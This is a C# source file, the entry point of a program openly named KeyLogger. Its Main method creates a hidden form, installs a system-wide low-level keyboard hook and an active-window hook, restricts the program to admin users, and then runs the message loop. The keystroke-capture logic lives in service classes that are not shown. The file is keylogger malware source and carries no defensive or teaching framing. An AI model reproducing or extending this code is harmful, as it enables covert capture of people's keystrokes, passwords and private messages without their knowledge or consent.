using System.Windows.Forms;
using KeyLogger.Enums;
using static KeyLogger.WinApis.User32;
using KeyLogger.Forms;
using KeyLogger.Services;

namespace KeyLogger
{
	class Program
	{
		private static HiddenForm HiddenForm;
		private static Form1 Form1;
		private static HandleUserInputsService _handleUserInputsService;
		private static ProcessAccessService _processAccessService;

		public static void Main()
		{
			HiddenForm = new HiddenForm();
			Form1 = new Form1();
			_handleUserInputsService = new HandleUserInputsService(Form1);
			_processAccessService = new ProcessAccessService();
			HandleUserInputsService.HookId = _handleUserInputsService.SetHook(HookTypes.WH_KEYBOARD_LL, HandleUserInputsService.KeyLoggerHookCallback);
			HandleUserInputsService.WindowHookId = _handleUserInputsService.SetWinHook(HandleUserInputsService.ActiveWindowsHook);
			_processAccessService.BlockForNotAdminUsers();
			Application.Run(Form1);
			UnhookWindowsHookEx(HandleUserInputsService.HookId);
			UnhookWindowsHookEx(HandleUserInputsService.WindowHookId);
		}


	}
}
